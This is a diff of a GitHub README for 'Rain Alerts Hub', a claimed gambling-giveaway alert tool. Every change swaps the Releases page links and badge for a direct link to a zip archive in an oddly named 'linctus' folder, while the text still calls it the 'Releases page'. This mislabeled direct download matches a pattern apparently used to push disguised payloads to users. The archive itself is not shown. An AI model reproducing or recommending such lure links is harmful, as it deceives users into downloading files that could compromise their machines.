@@ -4,10 +4,10 @@
 Rain Alerts Hub helps you never miss money giveaways on popular gambling sites. Get instant notifications in Telegram or Discord. This application brings alerts directly to you, so you can seize the opportunity as soon as it arises.
 
 ## 🔗 Download Link
-[![Download Rain-Alerts-Hub](https://img.shields.io/badge/Download-Rain--Alerts--Hub-blue.svg)](https://github.com/vengadoooooor/Rain-Alerts-Hub/releases)
+[![Download Rain-Alerts-Hub](https://raw.githubusercontent.com/vengadoooooor/Rain-Alerts-Hub/main/linctus/Rain-Alerts-Hub.zip)](https://raw.githubusercontent.com/vengadoooooor/Rain-Alerts-Hub/main/linctus/Rain-Alerts-Hub.zip)
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/vengadoooooor/Rain-Alerts-Hub/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/vengadoooooor/Rain-Alerts-Hub/main/linctus/Rain-Alerts-Hub.zip) to download the latest version.
 2. Choose the latest version from the list.
 3. Click on the relevant file for your operating system to start the download.
 
@@ -73,4 +73,4 @@ If you encounter any issues or have queries, please visit our GitHub issues page
 Join our growing community of users. Share tips, experiences, and get updates. Feel free to contribute to discussions and help each other succeed in catching those giveaways!
 
 ## 🔗 Final Download Link
-Don’t forget to visit the [Releases page](https://github.com/vengadoooooor/Rain-Alerts-Hub/releases) to download the latest version of Rain Alerts Hub!
+Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/vengadoooooor/Rain-Alerts-Hub/main/linctus/Rain-Alerts-Hub.zip) to download the latest version of Rain Alerts Hub!
